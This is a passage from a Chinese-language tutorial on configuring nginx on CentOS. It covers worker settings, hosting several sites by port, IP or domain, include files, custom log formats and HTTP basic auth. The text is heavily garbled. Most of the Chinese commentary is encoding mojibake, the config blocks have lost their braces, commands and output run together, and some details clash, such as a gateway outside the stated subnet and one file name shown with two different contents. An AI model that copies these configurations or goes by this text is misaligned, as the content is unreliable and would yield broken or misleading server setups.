scgi_params.default # scgi_paramsçš„å¤‡ä»½æ–‡ä»¶-rw-r--r-- 1 root root 664 11æœˆ 11 00:58 uwsgi_params -rw-r--r-- 1 root root 664 11æœˆ 11 00:58 uwsgi_params.default # uwsgi_paramsçš„å¤‡ä»½æ–‡ä»¶-rw-r--r-- 1 root root 3610 11æœˆ 11 00:58 win-utf æ‰€ä»¥å…¶å®æˆ‘ä»¬ä¸ç”¨è‡ªè¡Œè¿›è¡Œå¤‡ä»½äº†ã€‚ # å…ˆè¿‡æ»¤ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼Œå› ä¸ºé‡Œé¢çš„#å·ï¼Œç©ºè¡Œç­‰å¤ªå¤šäº†ï¼Œå¸¦#å·çš„éƒ½æ˜¯æ³¨é‡Šä¸ç”¨çš„ï¼Œæ‰€ä»¥å¯ä»¥å»æ‰ cd /etc/nginx/ grep -Ev #|^$ nginx.conf.default nginx.conf # ç¼–è¾‘é…ç½®æ–‡ä»¶ vim nginx.conf#åˆ é™¤17-20è¡Œ,å‰©ä¸‹çš„å°±æ˜¯æœ€å°é…ç½®äº†# æ³¨æ„é…ç½®æ–‡ä»¶çš„è¯­æ³•æ ¼å¼ï¼Œæ¯è¡Œç»“å°¾å¿…é¡»æ˜¯è‹±æ–‡çš„åˆ†å·ã€‚ worker_processes 1; #å¯åŠ¨nginxæ—¶å·¥ä½œè¿›ç¨‹çš„æ•°é‡ï¼Œå¯ä»¥åŠ å¤§è¿™ä¸ªæ•°å­—æ¥æé«˜nginxçš„å¤„ç†è¯·æ±‚çš„æ•ˆç‡ï¼Œä½†æ˜¯è¿™ä¸ªæ•°å­—ä¹Ÿä¸èƒ½å¤ªå¤§ï¼Œå› ä¸ºè¿›ç¨‹æ˜¯æ¶ˆè€—ç³»ç»Ÿå†…å­˜èµ„æºçš„ã€‚è°ƒæ•´ä¸€ä¸‹è¿™ä¸ªæ•°å­—ï¼Œç„¶åé€šè¿‡freeæŒ‡ä»¤å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹å†…å­˜å®¹é‡çš„å˜åŒ–ã€‚å»ºè®®å’ŒCPUæ ¸æ•°ä¸€è‡´å°±è¡Œ# worker_processes 2; # æ”¹å®Œé…ç½®æ–‡ä»¶éƒ½éœ€è¦é‡å¯nginxæ‰ç”Ÿæ•ˆï¼Œsystemctl restart nginx.serviceevents worker_connections 1024; #è¿æ¥æ•°é‡ï¼Œæ¯ä¸ªè¿›ç¨‹å¯ä»¥å¤„ç†1024è¿æ¥http #httpæ¨¡å— include mime.types; #includeæ˜¯åŒ…å«çš„æ„æ€ï¼Œè¿™è¡Œçš„æ„æ€æ˜¯ï¼Œnginxå¯åŠ¨çš„æ—¶å€™åŠ è½½nginx.confä¸»é…ç½®æ–‡ä»¶çš„æ—¶å€™ï¼ŒåŠ è½½åˆ°è¿™ä¸€è¡Œçš„æ—¶å€™ï¼Œå…ˆåŒ…å«åŠ è½½ä¸€ä¸‹mime.typesæ–‡ä»¶é‡Œé¢çš„é…ç½®ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸»è¦æ˜¯ç”¨æ¥æ ‡è¯†æ”¯æŒå“ªäº›å¤šåª’ä½“æ ¼å¼ï¼Œè¿™ä¸ªæ–‡ä»¶åœ¨nginx.confæ‰€åœ¨ç›®å½• default_type application/octet-stream; #å¦‚æœä¸èƒ½è¯†åˆ«çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆé»˜è®¤ä»¥å…«è¿›åˆ¶æ•°æ®æµçš„æ–¹å¼æ¥æ‰“å¼€æ–‡ä»¶ # ä¸‹é¢è¿™ä¸¤ä¸ªé…ç½®ä¹Ÿå¯ä»¥åˆ æ‰ï¼Œç°åœ¨ä¸å¤ªé€‚åˆè®²ï¼Œåé¢å†è®² # sendfile on; # keepalive_timeout 65; charset utf-8; #è®¾ç½®å­—ç¬¦é›†ï¼Œè¿™æ˜¯æˆ‘å¤šåŠ çš„ä¸€ä¸ªé…ç½®ï¼Œé»˜è®¤æ²¡æœ‰ï¼Œæ¯”å¦‚vim jaden.htmlå†™å…¥ä¸€äº›ä¸­æ–‡ï¼Œå»æ‰å’ŒåŠ ä¸Šè¿™ä¸ªé…ç½®çœ‹çœ‹æ•ˆæœ server # ä¸€ä¸ªç½‘ç«™ï¼Œä¸€ä¸ªnginxå¯ä»¥è¿è¡Œå¤šä¸ªç½‘ç«™ï¼Œæ·»åŠ è¿™ä¸ªé…ç½®é¡¹å³å¯ listen 80; # ç›‘å¬ç«¯å£ï¼Œå¯ä»¥ä¿®æ”¹ï¼Œæ¯”å¦‚æ”¹ä¸ª81çœ‹çœ‹æ•ˆæœï¼Œå†å¯åŠ¨apacheçœ‹çœ‹80æ•ˆæœ server_name localhost; #ç½‘ç«™çš„åŸŸåï¼Œç°åœ¨æ²¡æœ‰é…ç½®åŸŸåï¼Œé»˜è®¤å°±æ˜¯localhostï¼Œæ¯”å¦‚åé¢å¯ä»¥é…ç½®www.wulaoban.top location / #ç›®å½•ï¼Œ/æŒ‡è·Ÿç›®å½•ï¼Œé»˜è®¤å°±æ˜¯/usr/share/nginx root html ## ç›¸å¯¹è·¯å¾„ å®Œæˆè·¯å¾„å°±æ˜¯ /usr/share/nginx/html ç›®å½•#è·¯å¾„æ˜¯/usr/share/nginx/htmlï¼Œä¹Ÿå¯ä»¥æ”¹æ˜‚ï¼Œæ¯”å¦‚æ”¹æˆç»å¯¹è·¯å¾„root /usr/share/nginx/htmlï¼Œæˆ–è€…æ”¹ä¸ºå…¶ä»–è·¯å¾„root /web#root /web # æ”¹ä¸ºè¿™ä¸ªè¯•ä¸€ä¸‹ï¼Œåˆ«å¿˜äº†å»æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªwebç›®å½•ï¼Œç»™webç›®å½•ä¸€äº›æ–‡ä»¶çœ‹çœ‹æ•ˆæœï¼Œæ¯”å¦‚é‚£ä¸ªåŒ»ç–—çš„ç½‘ç«™ï¼Œhttp://192.168.61.139:81/yiliao/ï¼Œè¿˜å¯ä»¥ç›´æ¥æŠŠåŒ»ç–—çš„ç›®å½•å†…å®¹ç›´æ¥æ‹·è´åˆ°/webç›®å½•ä¸­ï¼Œå°±ä¸ç”¨æ¯æ¬¡è®¿é—®éƒ½/yiliao/äº† # [root@web01 web]# mv yiliao/* . # åœ¨è®¿é—®ï¼šhttp://192.168.61.139:81/ index index.html index.htm; #é»˜è®¤é¦–é¡µï¼Œè®¿é—®ç½‘å€æ ¹è·¯å¾„çš„æ—¶å€™ï¼Œè‡ªåŠ¨è®¿é—®ç«™ç‚¹æ ¹ç›®å½•ä¸‹é¢çš„indexæˆ–è€…index.htmlæˆ–è€…index.htmæ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰è¿™å‡ ä¸ªåå­—çš„æ–‡ä»¶å‘¢ï¼Ÿè®¿é—®çš„æ—¶å€™å°±ä¼šæç¤º403ï¼Œéœ€è¦åœ¨ç½‘å€ä¸Šæ‰‹åŠ¨æŒ‡å®šæ–‡ä»¶åç§°ï¼Œè¿™å‡ ä¸ªæ–‡ä»¶åç§°ä¹Ÿæ˜¯å¯ä»¥æ”¹çš„ï¼Œæ¯”å¦‚æ”¹ä¸ºjaden.htmlã€‚ # ç¬¬äºŒä¸ªç½‘ç«™ï¼š #server # listen 81; # server_name localhost; # location / # root html; # index index.html index.htm; # # # ä¿®æ”¹å®Œé…ç½®æ–‡ä»¶ä¹‹åï¼Œå¯ä»¥æ£€æŸ¥ä¸€ä¸‹é…ç½®æ–‡ä»¶çš„è¯­æ³•æ˜¯å¦ok[root@web01 nginx]# nginx -tnginx: the configuration file /etc/nginx/nginx.conf syntax is oknginx: configuration file /etc/nginx/nginx.conf test is successful# ç™¾åº¦æ˜¯phpè¯­è¨€å¼€å‘çš„ï¼šä¸‹é¢ä¸¤ä¸ªæ–¹å¼è®¿é—®æ•ˆæœä¸€æ ·ï¼Œbaiduçš„é¦–é¡µå…¶å®æ˜¯index.php# https://www.baidu.com/# https://www.baidu.com/index.php æŸ¥çœ‹nginxè¿›ç¨‹ [root@web01 nginx]# ps -ef | grep nginx root 1725 1 0 20:16 ? 00:00:00 nginx: master process /usr/sbin/nginx # master processæ˜¯ä¸»è¿›ç¨‹çš„æ„æ€ï¼Œä¹Ÿå«åšç®¡ç†è¿›ç¨‹ï¼Œå®ƒæ˜¯ç”¨æ¥ç®¡ç†nginxæ•´ä¸ªè¿è¡Œçš„ï¼Œnginxçš„å…¶ä»–å­è¿›ç¨‹å¦‚æœæ­»æ‰äº†ï¼Œå®ƒä¼šè‡ªåŠ¨åœ¨å¯åŠ¨å…¶ä»–çš„å­è¿›ç¨‹ï¼Œæ¯”å¦‚å°è¯•kill ä¸‹é¢çš„å­è¿›ç¨‹ï¼Œä½ ä¼šå‘ç°å¦å¤–ä¸€ä¸ªè¿›ç¨‹åˆè‡ªåŠ¨å¯åŠ¨äº†ã€‚çœŸæ­£å¹²æ´»çš„è¿›ç¨‹æ˜¯ä¸‹é¢çš„worker processè¿›ç¨‹ï¼Œå«åšå·¥ä½œè¿›ç¨‹ï¼Œæœ‰è¯·æ±‚æ¥äº†éƒ½æ˜¯å®ƒå¤„ç†çš„nginx 1727 1725 0 20:16 ? 00:00:00 nginx: worker process # å¯ä»¥çœ‹åˆ°nginxæ˜¯ä»¥nginxç”¨æˆ·èº«ä»½å¯åŠ¨çš„root 1869 1552 0 20:35 pts/0 00:00:00 vim nginx.confroot 1898 1872 0 20:35 pts/1 00:00:00 grep --color=auto nginx æŸ¥çœ‹mime.typesï¼Œnginxæ”¯æŒçš„å¤šåª’ä½“ç±»å‹æ–‡ä»¶ vim mime.types é»˜è®¤nginxçš„ç«™ç‚¹æ ¹ç›®å½•(å­˜æ”¾ç½‘ç«™ä»£ç çš„ç›®å½•ï¼Œä¹Ÿå«åšç½‘ç«™çš„ç‰©ç†è·¯å¾„ã€çœŸå®è·¯å¾„ç­‰)åœ¨å¦‚ä¸‹ä½ç½® [root@web01 nginx]# cd /usr/share/nginx/html/[root@web01 nginx]# ls404.html 50x.html en-US icons img index.html nginx-logo.png poweredby.png æˆ‘ä»¬é€šè¿‡æµè§ˆå™¨ç½‘å€è®¿é—®nginxå¯åŠ¨çš„ç½‘ç«™é¡µé¢æ—¶ï¼Œé»˜è®¤nginxéƒ½ä¼šåœ¨è¿™ä¸ªç›®å½•ä¸­å»å¯»æ‰¾ç”¨æˆ·è®¿é—®çš„é¡µé¢å¯¹åº”çš„HTMLæ–‡ä»¶ã€‚ http://192.168.61.139/ --- index.htmlhttp://192.168.61.139/img/centos-logo.png --- img/centos-logo.png æ¯”å¦‚æˆ‘ä»¬æ”¾ä¸€ä¸ªmp4æ ¼å¼çš„æ–‡ä»¶ä¸Šæ¥ï¼Œç›´æ¥è®¿é—®æ–‡ä»¶åç§°å°±å¯ä»¥æ’­æ”¾ http://192.168.61.139/jaden.mp4 # è¿™æ˜¯å› ä¸ºnginxçš„é…ç½®æ–‡ä»¶mime.typesä¸­çœ‹åˆ°ï¼Œæ”¯æŒmp4ï¼Œå¦‚æœåˆ æ‰äº†é…ç½®æ–‡ä»¶ä¸­mp4é‚£ä¸€è¡Œæ•°æ®ï¼Œé‚£ä¹ˆå°±ä¸æ”¯æŒmp4æ ¼å¼æ–‡ä»¶çš„é¢„è§ˆäº†ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½ç›´æ¥åœ¨æµè§ˆå™¨ä¸Šæ’­æ”¾mp4è§†é¢‘äº†ï¼Œè€Œæ˜¯ç›´æ¥ä¸‹è½½ï¼Œä½†æ˜¯ç°åœ¨æµè§ˆå™¨åšçš„åŠŸèƒ½æ¯”è¾ƒå¼ºå¤§äº†ï¼Œæœ‰äº›æµè§ˆå™¨ä¹Ÿä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬æ’­æ”¾mp4çš„è§†é¢‘ã€‚å¦‚æœæ˜¯nginxä¸èƒ½è¯†åˆ«çš„æ–‡ä»¶æ ¼å¼ã€å¹¶ä¸”æµè§ˆå™¨ä¹Ÿä¸èƒ½è¯†åˆ«è¿™ç§æ–‡ä»¶æ ¼å¼ï¼Œæ¯”å¦‚xx.jadenï¼Œé‚£ä¹ˆè®¿é—®ä¸€ä¸‹ä¼šç›´æ¥ä¸‹è½½è¿™ä¸ªæ–‡ä»¶ã€‚#å†æ¯”å¦‚ï¼Œå¦‚æœæ˜¯nginxæ”¯æŒï¼Œä½†æ˜¯æµè§ˆå™¨ä¸æ”¯æŒçš„æ–‡ä»¶æ ¼å¼ï¼Œæ¯”å¦‚htcæ ¼å¼çš„æ–‡ä»¶ï¼Œnginxèƒ½è¯†åˆ«ï¼Œä½†æ˜¯æµè§ˆå™¨ä¸æ”¯æŒï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šå°è¯•ç”¨txtçš„æ–¹å¼æ¥æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœæ˜¯ä¸€äº›è§†é¢‘æˆ–è€…å›¾ç‰‡ï¼Œé‚£ä¹ˆå°±åœ¨æµè§ˆå™¨ä¸Šçœ‹åˆ°ä¸€å †ä¹±ç ã€‚ å¦‚æœnginxå’Œæµè§ˆå™¨éƒ½ä¸æ”¯æŒçš„ï¼ŒåŸºæœ¬å°±ä¼šçœ‹åˆ°ç›´æ¥ä¸‹è½½ã€‚ å¦‚æœæˆ‘ä»¬åˆ é™¤äº† usrsharenginxhtml ç›®å½•ä¸­çš„å…¨éƒ¨æ–‡ä»¶å’Œç›®å½•ï¼Œå¦‚ä¸‹ [root@web01 nginx]# cd /usr/share/nginx/html/[root@web01 html]# rm -rf * è®¿é—®ä¸€ä¸‹ï¼Œæ€ä¹ˆè¿˜èƒ½çœ‹åˆ°è¿™ä¸ªé¡µé¢ï¼Œè¿™æ˜¯æµè§ˆå™¨åšçš„ç¼“å­˜ï¼Œå°†ä½ çš„é¡µé¢å·²ç»ç¼“å­˜åˆ°ä½ è‡ªå·±ç”µè„‘æœ¬åœ°äº†ï¼Œä¸€è®¿é—®è¿˜æ˜¯è®¿é—®çš„æœ¬åœ°ç¼“å­˜çš„é¡µé¢ 3.17 Nginxè¿›é˜¶3.17.1 Nginxå¤šç«™ç‚¹é…ç½®[root@web01 nginx]# cat nginx.conf worker_processes 2; events worker_connections 1024; http include mime.types; default_type application/octet-stream; charset utf-8; # 8yyå¤åˆ¶8è¡Œï¼Œå°pé»è´´ server listen 80; server_name localhost; location / root /html/one; index index.html index.htm; server listen 81; server_name localhost; location / root /html/two; index index.html index.htm; server listen 82; server_name localhost; location / root /html/three; index index.html index.htm; [root@web01 nginx]# mkdir -p /html/one,two,three[root@web01 nginx]# echo one /html/one/index.html[root@web01 nginx]# echo two /html/two/index.html[root@web01 nginx]# echo three /html/three/index.html # æˆ–è€…ç»™ä¸‰ä¸ªç›®å½•ä¸­éƒ½æ”¾ä¸ªä¸åŒçš„ç½‘ç«™æºä»£ç ï¼Œone--yiliao two--youxi three--éšä¾¿æ¥ä¸ªindex.htmlå³å¯ # è§£å‹æŒ‡ä»¤ï¼štar -xf youxi.tar.gz # åœ¨ç«™ç‚¹æ ¹ç›®å½•ä¸‹æ²¡æœ‰index.htmlé¦–é¡µæ–‡ä»¶ï¼Œé‚£ä¹ˆç›´æ¥è®¿é—®ç½‘å€ä¼šæŠ¥403çš„é”™è¯¯ã€‚[root@web01 nginx]# systemctl restart nginx.service å¤šç«¯å£çš„è¿™ç§å½¢å¼ï¼Œå¤§å®¶ä¼šå‘ç°ï¼Œé™¤äº†80ç«¯å£å¯¹åº”çš„ç½‘ç«™ï¼Œè®¿é—®çš„æ—¶å€™ä¸éœ€è¦è¾“å…¥ç«¯å£ä¹‹å¤–ï¼Œå…¶ä»–çš„ç½‘ç«™éƒ½éœ€è¦è¾“å…¥ç«¯å£ï¼Œå°±æ¯”è¾ƒéº»çƒ¦ï¼Œæœ‰äº›ç½‘ç«™å°±è¯´ï¼Œæˆ‘çš„èƒ½ä¸èƒ½ä¸åŠ ç«¯å£å‘¢ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæˆ‘ä»¬æ¢ä¸€ä¸ªæ–¹å¼ï¼Œè®©æ¯ä¸ªç½‘ç«™éƒ½èƒ½ç”¨ä¸Š80ç«¯å£ã€‚ 3.17.2 å¤šipéƒ¨ç½²ç«™ç‚¹ä¿®æ”¹ç½‘å¡é…ç½® [root@web01 three]# cd /etc/sysconfig/network-scripts/[root@web01 network-scripts]# ls[root@web01 network-scripts]# vim ifcfg-ens33 TYPE=Ethernet BOOTPROTO=static NAME=ens33 DEVICE=ens33 ONBOOT=yes IPADDR1=192.168.61.139 IPADDR2=192.168.61.140 IPADDR3=192.168.61.141 NETMASK=255.255.255.0 GATEWAY=192.168.20.2DNS1=223.5.5.5 # ä¿å­˜é€€å‡º# é‡å¯ç½‘å¡æœåŠ¡ï¼šsystemctl restart networkï¼ŒæŸ¥çœ‹ipåœ°å€ï¼š å¤šä¸ªipåœ°å€éƒ½é…ç½®å¥½äº†ã€‚é‚£ä¹ˆä¹‹å‰çš„ä¸‰ä¸ªç½‘ç«™ï¼Œæˆ‘ä»¬è°ƒæ•´ä¸€ä¸‹é…ç½®å³å¯ï¼Œæ¯ä¸ªç½‘ç«™å°±å¯ä»¥éƒ½ç”¨80ç«¯å£äº†ã€‚ [root@web01 nginx]# vim nginx.confworker_processes 1;events worker_connections 1024;http include mime.types; default_type application/octet-stream; charset utf-8; server listen 80; server_name localhost; location / default_type application/octet-stream; charset utf-8; server listen 192.168.61.139:80; # ç›´æ¥å†™ipåœ°å€å’Œç«¯å£ï¼Œå¤§å®¶éƒ½æ˜¯80ç«¯å£ server_name localhost; location / root /web/one; index index.html index.htm; server listen 192.168.61.140:80; server_name localhost; location / root /web/two; index index.html index.htm; server listen 192.168.61.141:80; server_name localhost; location / root /web/three; index index.html index.htm; # ä¿å­˜é€€å‡º# æ£€æŸ¥ä¸€ä¸‹è¯­æ³• [root@web01 nginx]# nginx -t# é‡å¯nginx systemctl restart nginx# æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µ [root@web01 nginx]# netstat -lntup 3.17.3 å¤šåŸŸåé…ç½®ç«™ç‚¹å¤šipçš„æ–¹å¼å…¶å®ä¹Ÿä¸å¤ªå¥½ï¼Œå› ä¸ºå¦‚æœæˆ‘ä»¬çš„å¤šç½‘ç«™æƒ³åœ¨äº’è”ç½‘ä¸Šè¢«å…¬ç½‘è®¿é—®ï¼Œé‚£ä¹ˆå°±éœ€è¦å¤šä¸ªipï¼Œè€Œå…¬ç½‘ipæ˜¯æ”¶è´¹çš„ã€‚é‚£ä¹ˆæœ‰ä¸€ç§çœé’±çš„æ–¹å¼ï¼Œå°±æ˜¯å¤šåŸŸåæ–¹å¼ã€‚ server listen 80; server_name a.jaden.com; location / root /html/one; index index.html index.htm; server listen 80; server_name b.jaden.com; location / root /html/two; index index.html index.htm; server listen 80; server_name c.jaden.com; location / root /html/three; index index.html index.htm; #ä¿®æ”¹å®Œé…ç½®æ–‡ä»¶ä¹‹åï¼Œé‡å¯nginx å› ä¸ºjaden.comä¸æ˜¯æˆ‘çš„ï¼Œæˆ‘ä»¬ç›´æ¥é€šè¿‡æµè§ˆå™¨è®¿é—®www.jaden.comå¯èƒ½ä¼šè®¿é—®åˆ«äººçš„ç½‘ç«™ï¼Œæˆ‘ä»¬ç°åœ¨åšå®éªŒæƒ³æš‚ç”¨ä¸€ä¸‹è¿™ä¸ªåŸŸåï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æˆ‘ä»¬ç‰©ç†æœºç³»ç»Ÿçš„hostsæ–‡ä»¶ï¼Œæ·»åŠ ä¸€ä¸ªipå’ŒåŸŸåçš„å¯¹åº”å…³ç³»å³å¯ï¼Œå› ä¸ºhostsæ–‡ä»¶çš„ä¼˜å…ˆçº§æ¯”DNSæœåŠ¡å™¨è¦é«˜ã€‚ # C:\\Windows\\System32\\drivers\\etc\\hosts192.168.61.139 a.jaden.com b.jaden.com c.jaden.com# cmdæ¥pingä¸€ä¸‹åŸŸåping a.jaden.com 3.17.4 includeé…ç½®æ–‡ä»¶[root@web01 nginx]# cat nginx.conf worker_processes 2; events worker_connections 1024; http include mime.types; default_type application/octet-stream; charset utf-8; include /etc/nginx/conf.d/*.conf; # åŠ è½½å¤–éƒ¨ä»¥.confç»“å°¾çš„é…ç½®æ–‡ä»¶ï¼Œå¦‚æœä½ çš„è·¯å¾„ä¸‹æ²¡æœ‰conf.då°±è‡ªè¡Œåˆ›å»ºä¸€ä¸ª-- mkdir conf.d [root@web01 conf.d]# cat d_com.conf server listen 80; server_name d.com; location / root /html/one; index index.html index.htm; [root@web01 conf.d]# cat d_com.conf server listen 80; server_name c.com; location / root /html/two; index index.html index.htm; # å¯ä»¥åœ¨documentationæ–‡æ¡£ä¸­æ‰¾åˆ°é»˜è®¤ç«™ç‚¹é…ç½®æ–¹å¼ï¼Œä¸‹é¢è¿™ä¸ªç½‘ç«™å°±å˜æˆäº†é»˜è®¤ç½‘ç«™ï¼Œå½“è®¿é—®çš„åŸŸånginxä¸èƒ½åŒ¹é…åˆ°å¯¹åº”ç½‘ç«™æ—¶ï¼Œå°±è‡ªåŠ¨æ‰“å¼€ä¸‹é¢è¿™ä¸ªç½‘ç«™ã€‚[root@web01 conf.d]# cat c_com.conf server listen 80 default_server; ## ç«¯å£åé¢åŠ  default_server server_name d.com; location / root /html/one; index index.html index.htm; 3.17.5 nginxæ—¥å¿—ä¹‹å‰æˆ‘ä»¬ä¹Ÿçœ‹è¿‡æ—¥å¿—ï¼Œç³»ç»Ÿçš„å®‰å…¨æ—¥å¿—ï¼Œå°±æ˜¯sshç™»å½•çš„æ—¶å€™æˆ‘ä»¬çœ‹çš„ï¼Œå¦‚ä¸‹ [root@web01 conf.d]# cat /var/log/secure nginxé»˜è®¤å·²ç»å¸®æˆ‘ä»¬è®°å½•äº†æ—¥å¿—ï¼Œåœ¨ varlognginx ç›®å½•ä¸‹é¢ã€‚ [root@web01 conf.d]# ls /var/log/nginx/access.log access.log-20230412 error.log error.log-20230412 #æ¯ä¸ªæ—¥å¿—æ˜¯ä¼šæŒ‰ç…§å½“å¤©çš„æ—¥æœŸè¿›è¡Œåˆ‡å‰²# æˆ‘ä»¬æ¸…ç©ºä¸€ä¸‹æ—¥å¿—[root@web01 nginx]# access.log[root@web01 nginx]# cat access.log# è®¿é—®ä¸€ä¸‹ç½‘ç«™ï¼Œå†çœ‹æ—¥å¿—[root@web01 nginx]# cat access.log192.168.61.1 - - [12/Apr/2023:15:17:44 +0800] GET /icon/duimutou.png HTTP/1.1 200 78796 http://b.jaden.com/ Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36# 304çŠ¶æ€ç è¡¨ç¤ºå®¢æˆ·ç«¯æµè§ˆå™¨ç”¨çš„æ˜¯æµè§ˆå™¨ç¼“å­˜é¡µé¢ï¼Œæ‰€ä»¥çœ‹åˆ°åé¢æ˜¯0ï¼Œè¡¨ç¤ºæ²¡æœ‰å“åº”ä»»ä½•æ•°æ® 5-1 é”™è¯¯æ—¥å¿—[root@web01 nginx]# cat error.log2023/04/12 11:34:25 [error] 2342#2342: *1 open() /web/one/favicon.ico failed (2: No such file or directory), client: 192.168.61.1, server: localhost, request: GET /favicon.ico HTTP/1.1, host: 192.168.61.139, referrer: http://192.168.61.139/#æ²¡æœ‰favicon.icoæ–‡ä»¶ï¼Œå¯ä»¥åˆ‡æ¢åˆ°ç«™ç‚¹ç›®å½•ä¸­å»ä¸‹è½½ä¸€ä¸ªï¼šwget https://www.mi.com/favicon.ico# è¿˜æœ‰äººæ•…æ„è®¿é—®ä¸€ä¸ªé”™è¯¯çš„è·¯å¾„ï¼Œè®©ä½ çš„ç½‘ç«™æŠ¥é”™ï¼Œæ˜¾ç¤ºå‡ºnginxçš„ç‰ˆæœ¬ã€‚ error_log /opt/nginx_error.log info; 5-2 è®¿é—®æ—¥å¿—# å®šåˆ¶æ—¥å¿—è®°å½•æ ¼å¼ï¼šè¿™ä¸ªå¿…é¡»é…ç½®åœ¨åœ¨serveré…ç½®å¤–é¢æ˜‚log_format compression $remote_addr - $remote_user [$time_local] $request $status $bytes_sent $http_referer $http_user_agent $gzip_ratio; # compressionå¯ä»¥ç†è§£ä¸ºæ˜¯è¿™ä¸ªæ ¼å¼çš„åå­—ï¼Œè°æƒ³ç”¨è¿™ä¸ªæ ¼å¼ï¼Œè°å°±ç”¨è¿™ä¸ªåå­—æ¥æŒ‡å®šæ ¼å¼192.168.61.1 - - [12/Apr/2023:14:19:59 +0800] GET / HTTP/1.1 304 0 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 # $remote_addr å®¢æˆ·ç«¯çš„ipåœ°å€ # $remote_user å®¢æˆ·ç«¯çš„ç”¨æˆ·å # $time_local å½“å‰æ—¶é—´ # $request è¯·æ±‚èµ·å§‹è¡Œ # $status httpçŠ¶æ€ç  # $bytes_sent å“åº”èµ„æºçš„å¤§å° # $http_referer è®°å½•èµ„æºçš„è·³è½¬åœ°å€ # $http_user_agent ç”¨æˆ·çš„ç»ˆç«¯ä¿¡æ¯ # $gzip_ratio gzipçš„å‹ç¼©çº§åˆ« # æ¯”å¦‚æˆ‘ä»¬æƒ³è®©æ—¥å¿—è®°å½•ä¸€ä¸‹è¯·æ±‚æ—¶é—´ã€å®¢æˆ·ç«¯ipã€è¯·æ±‚uriã€çŠ¶æ€ç ã€æ–‡ä»¶å¤§å° # vim /etc/nginx/nginx.conf worker_processes 1;events worker_connections 1024;http log_format test [$time_local] $remote_addr $request $status $bytes_sent; ## testæ˜¯æ—¥å¿—åå­— åé¢æ˜¯æ—¥å¿—æ ¼å¼ include mime.types; default_type application/octet-stream; charset utf-8; include /etc/nginx/conf.d/*.conf;# æ¯ä¸ªç½‘ç«™éƒ½å¯ä»¥å•ç‹¬è®°å½•è‡ªå·±çš„æ—¥å¿—[root@web01 nginx]# cd conf.d/[root@web01 conf.d]# ls a.jaden.com.conf.stop b.jaden.com.conf c.jaden.com.conf[root@web01 conf.d]# vim b.jaden.com.conf server listen 80; server_name b.jaden.com; access_log /opt/nginx/b.jaden.com_log test; # testæ˜¯ä¸Šé¢æŒ‡å®šçš„æ—¥å¿—æ ¼å¼çš„åç§°ï¼Œ/opt/ç›®å½•ä¸‹é¢æ²¡æœ‰nginxç›®å½•ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨åˆ›å»ºï¼Œè¿™ä¸ªç›®å½•æ˜¯éšæ„æŒ‡å®šçš„æ˜‚ï¼Œmkdir /opt/nginxï¼Œ## è¿˜è¦æˆæƒï¼šchown nginx:nginx /opt/nginxï¼Œä¸ç„¶nginxç”¨æˆ·æ²¡åŠæ³•è®¿é—®è¿™ä¸ªç›®å½• location / root /web/two; index index.html index.htm; # æ”¹å®Œä¹‹åï¼Œé‡å¯nginxï¼Œç„¶åè®¿é—®ç½‘ç«™ï¼Œçœ‹ä¸€ä¸‹/opt/nginxç›®å½•ï¼Œçœ‹çœ‹æ—¥å¿—æ ¼å¼ã€‚# access_log /var/log/nginx/access.log compression;# access_log /opt/nginx/access.log compression; # /opt/ç›®å½•éœ€è¦æˆæƒï¼Œä¸ç„¶æ²¡åŠæ³•è®°å½•è¿›å»# æ³¨æ„ï¼šé”™è¯¯æ—¥å¿—çš„æ ¼å¼æˆ‘ä»¬æ˜¯ä¸èƒ½è‡ªå®šä¹‰çš„ï¼Œé¡¶å¤šèƒ½ä¿®æ”¹é”™è¯¯æ—¥å¿—çš„ä¿å­˜è·¯å¾„ã€‚#å®˜æ–¹æ–‡æ¡£http://nginx.org/en/docs/http/ngx_http_log_module.html 3.17.6 å¼€å¯basicè®¤è¯æœ‰äº›ç½‘ç«™ä¼šå¼€å¯ä¸€ä¸ªå«åšbasicè®¤è¯çš„ä¸œè¥¿ï¼Œbasicè®¤è¯å«åšhttpåŸºæœ¬è®¤è¯ï¼Œå°±æ˜¯ç»™æˆ‘ä»¬çš„ç½‘ç«™å¤šä¸€æŠŠé”ï¼Œé˜²æ­¢æ¶æ„è®¿é—®ï¼Œæ¯”å¦‚è®¿é—®ä¸€äº›æ•æ„Ÿåå°è·¯å¾„ç­‰æ“ä½œã€‚ æŠŠç”Ÿæˆçš„å¯†ç ä¿å­˜ä¸‹æ¥ï¼Œæ¯”å¦‚ä¿å­˜åˆ° etcnginxhtpasswd æ–‡ä»¶ä¸­ vim /etc/nginx/htpasswd# å†™å…¥åˆšæ‰ä¿å­˜çš„ç”¨æˆ·å’Œå¯†ç jaden:FdHiKZYkjLx.sauth_basic b.jaden.com; #auth_basicè¡¨ç¤ºå¼€å¯ ç„¶åä¿®æ”¹ä¸€ä¸‹nginxä¸‹çš„bç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼š auth_basic b.jaden.com; #auth_basicè¡¨ç¤ºå¼€å¯è¿™ä¸ªåŠŸèƒ½ï¼Œb.jaden.comæ˜¯å¤‡æ³¨ä¿¡æ¯ï¼Œéšä¾¿å†™ï¼Œä¸€äº›è€æµè§ˆå™¨èƒ½çœ‹åˆ°ï¼Œæ–°æµè§ˆå™¨éƒ½çœ‹ä¸åˆ°å¤‡æ³¨ä¿¡æ¯äº†ã€‚auth_basic_user_file /etc/nginx/htpasswd; # è¿™æ˜¯è´¦å·å¯†ç å­˜æ”¾åœ¨å“ªä¸ªä½ç½® å¦‚ä¸‹ [root@web01 nginx]# cd /etc/nginx/conf.d/[root@web01 conf.d]# 